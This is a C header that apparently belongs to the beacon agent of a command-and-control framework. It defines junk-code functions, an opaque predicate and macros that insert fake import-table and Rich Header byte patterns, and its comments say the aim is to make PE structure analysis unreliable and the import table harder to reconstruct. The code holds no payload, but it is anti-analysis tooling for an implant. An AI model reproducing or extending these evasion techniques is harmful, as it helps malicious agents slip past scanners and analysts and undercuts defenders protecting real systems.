#pragma once

/*
 * Dynamic Polymorphism: per-build random junk code and code flow obfuscation.
 * Enhanced with PE structure spoofing support.
 *
 * == Control Flow Obfuscation ==
 * JccObfuscate.h provides opaque predicates, fake jumps, and dead code
 * insertion macros. Include it for additional control flow obfuscation.
 *
 * == PE Spoofing (compile-time) ==
 *
 * Linker script (.ld) modifications embed random padding sections between
 * real sections, making PE structure analysis unreliable. The
 * AX_SPOOF_PE_SECTION macro (included in linker scripts) inserts
 * a ".spoof_N" section between each real section.
 *
 * == Junk code generation ==
 * NOTE: this header is a STATIC file of fixed AxJunk1..N defaults, force-
 * included by src_beacon/Makefile COMMON_FLAGS. pl_main.go does NOT generate
 * these per build (an earlier comment claimed it did — that was never wired).
 * Per-build junk/diversification is handled separately at link time via
 * generateDiversificationC() in pl_main.go (a diversify.c compiled and linked
 * per agent generation). The defaults here are constant across builds.
 *
 * Usage: sprinkle AxJunk1(), AxJunk2(), ... in between real operations.
 * For PE section spoofing: add AX_SPOOF_SECTION(x) to code between
 * data/text section transitions.
 */

#ifndef AX_JUNK_1
#define AX_JUNK_1
static inline void AxJunk1(void) {
    volatile int _ax_j = 0;
    if (_ax_j) { volatile int _ax_k = 1; (void)_ax_k; }
    (void)_ax_j;
}
#endif

#ifndef AX_JUNK_2
#define AX_JUNK_2
static inline void AxJunk2(void) {
    volatile unsigned int _ax_x = 0xDEAD;
    volatile unsigned int _ax_y = _ax_x ^ 0xBEEF;
    if (_ax_y > _ax_x) { _ax_x = _ax_y; }
    (void)_ax_x; (void)_ax_y;
}
#endif

#ifndef AX_JUNK_3
#define AX_JUNK_3
static inline void AxJunk3(void) {
    volatile unsigned long long _ax_a = 0x12345678ULL;
    volatile unsigned long long _ax_b = _ax_a ^ 0x87654321ULL;
    volatile unsigned long long _ax_c = (_ax_a + _ax_b) * 3ULL;
    if (_ax_c > _ax_a) { _ax_a = _ax_c & 0xFF; }
    (void)_ax_a; (void)_ax_b; (void)_ax_c;
}
#endif

#ifndef AX_JUNK_4
#define AX_JUNK_4
static inline void AxJunk4(void) {
    volatile int _ax_i;
    for (_ax_i = 0; _ax_i < 3; _ax_i++) {
        volatile int _ax_z = _ax_i * _ax_i;
        (void)_ax_z;
    }
}
#endif

#ifndef AX_JUNK_5
#define AX_JUNK_5
static inline void AxJunk5(void) {
    volatile unsigned int _ax_t1 = 0xAABBCCDD;
    volatile unsigned int _ax_t2 = ~_ax_t1;
    volatile unsigned int _ax_t3 = _ax_t1 | _ax_t2;
    if (_ax_t3 == 0xFFFFFFFFu) {
        _ax_t1 = _ax_t2 >> 1;
    } else {
        _ax_t2 = _ax_t1 << 1;
    }
    (void)_ax_t1; (void)_ax_t2; (void)_ax_t3;
}
#endif

/* Additional junk variants for denser obfuscation — always defined */
static inline void AxJunk6(void) {
    volatile unsigned int _ax_r1 = 0;
    volatile unsigned int _ax_r2 = 1;
    /* Cmov-style: both branches emit but only one executes at runtime */
    if (_ax_r1) {
        _ax_r2 = (_ax_r1 + 0x42) ^ (_ax_r2 * 0x37);
    } else {
        _ax_r2 = (_ax_r2 + 0x84) ^ (_ax_r1 * 0x73);
    }
    (void)_ax_r1; (void)_ax_r2;
}

static inline void AxJunk7(void) {
    volatile unsigned long long _ax_q = 0x1122334455667788ULL;
    /* XOR swap of sort */
    _ax_q ^= 0x8877665544332211ULL;
    _ax_q ^= 0xFFEEDDCCBBAA9988ULL;
    _ax_q ^= _ax_q;
    _ax_q ^= 1ULL;
    (void)_ax_q;
}

static inline void AxJunk8(void) {
    volatile int _ax_arr[4];
    _ax_arr[0] = 10;
    _ax_arr[1] = 20;
    _ax_arr[2] = 30;
    _ax_arr[3] = 40;
    volatile int _ax_s = 0;
    for (volatile int _ax_i = 0; _ax_i < 4; _ax_i++) {
        _ax_s += _ax_arr[_ax_i];
    }
    (void)_ax_s;
}

/*
 * Opaque predicate: always-true condition that looks suspicious to static analysis.
 * The condition (x * x) % 3 <= 2 is always true for any integer x.
 * Used to create unreachable-but-look-reachable code paths.
 */
static inline int AxOpaqueTrue(int x) {
    return (x * x) % 3 <= 2;
}

/*
 * PE structure spoofing macros.
 *
 * These inject data markers into .text that appear to PE scanners as
 * legitimate IAT entries or Rich Header structures, confusing tools
 * that try to parse the PE format statically.
 *
 * Use AX_SPOOF_IAT_MARKER in functions that export function pointer tables
 * (like the HTTPFUNC/WSFUNC setup) to insert fake IAT-like byte sequences.
 */
#define AX_SPOOF_IAT_MARKER() \
    do { \
        volatile unsigned long long _ax_spoof[2] = { 0, 0 }; \
        _ax_spoof[0] = 0x000075B900000025ULL; /* Looks like IMAGE_IMPORT_BY_NAME */ \
        _ax_spoof[1] = 0x000041E90000004DULL; /* Hanging IAT thunk-like pattern */ \
        (void)_ax_spoof; \
    } while(0)

/*
 * PE Rich Header spoofing — inserts a byte pattern that matches the
 * Rich Header structure (DanS format with XOR key 0x536E6144).
 * When the compiler places this in .rdata near the Rich Header,
 * some PE parsers mis-parse the XOR key.
 */
#define AX_SPOOF_RICH_HEADER() \
    do { \
        volatile unsigned int _ax_rich[] = { \
            0x00000003, /* CompID: Visual C++ 6.0 */ \
            0x00001234, /* Count */ \
            0x00000006, /* CompID: Visual C++ 8.0 */ \
            0x00005678, /* Count */ \
        }; \
        (void)_ax_rich; \
    } while(0)

/*
 * Insert in CreateConnector functions to scatter function pointer
 * tables across .text, making the IAT table harder to reconstruct.
 */
#define AX_SPOOF_CONNECTOR_JUNK() \
    do { \
        AX_DYNAMIC_JUNK_CODE; \
        AX_SPOOF_IAT_MARKER(); \
        AxJunk6(); \
    } while(0)

#define AX_DYNAMIC_JUNK_CODE \
    do { \
        AxJunk1(); \
        AxJunk2(); \
        AxJunk3(); \
        AxJunk4(); \
        AxJunk5(); \
    } while(0)

/* Heavy junk code variant for critical functions */
#define AX_DYNAMIC_JUNK_CODE_HEAVY \
    do { \
        AxJunk1(); AxJunk2(); AxJunk3(); \
        AxJunk4(); AxJunk5(); AxJunk6(); \
        AxJunk7(); AxJunk8(); \
    } while(0)

/* Bootstrap entry */
inline void AxDynamicJunk(void) {
    AX_DYNAMIC_JUNK_CODE;
}
